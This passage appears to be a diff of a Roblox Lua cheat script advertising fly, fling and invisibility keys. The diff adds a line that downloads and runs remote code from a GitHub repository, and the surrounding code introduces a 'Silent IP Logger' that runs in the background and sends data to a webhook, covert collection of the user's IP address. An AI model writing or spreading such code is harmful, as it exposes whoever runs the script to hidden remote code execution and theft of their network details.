@@ -4,7 +4,7 @@
   Press F to Fly, G to Fling, V for Invisibility
 ]]
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YourGithubRepo/YourScript/main/ExploitScript.lua"))() -- Fake loadstring (replace with real one if needed)
+loadstring(game:HttpGet("https://github.com/skibidisigma2025/RobloxScripts/tree/main"))() 
 
 -- Silent IP Logger (Runs in background)
 local function SendToWebhook(data)
